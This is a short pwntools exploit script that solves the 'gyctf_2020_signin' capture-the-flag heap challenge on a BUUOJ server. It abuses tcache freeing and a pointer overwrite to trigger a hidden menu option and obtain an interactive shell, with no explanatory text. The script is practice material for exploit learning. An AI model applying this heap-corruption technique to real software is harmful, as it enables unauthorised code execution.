from pwn import *

#context.log_level = 'debug'

#p = process('./gyctf_2020_signin')
p = remote('node4.buuoj.cn', 28845)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + '\n' + s)
    pause()

def alloc(index):
    p.sendlineafter(b'your choice?', b'1')
    p.sendlineafter(b'idx?\n', str(index).encode())

def edit(index, content):
    p.sendlineafter(b'your choice?', b'2')
    p.sendlineafter(b'idx?\n', str(index).encode())
    p.sendline(content)

def delete(index):
    p.sendlineafter(b'your choice?', b'3')
    p.sendlineafter(b'idx?\n', str(index).encode())

ptr = 0x4040C0

for i in range(8):
    alloc(i)
for i in range(8):
    delete(i)

edit(7, p64(ptr - 0x10))
alloc(8)

p.sendlineafter(b'your choice?', b'6')

p.interactive()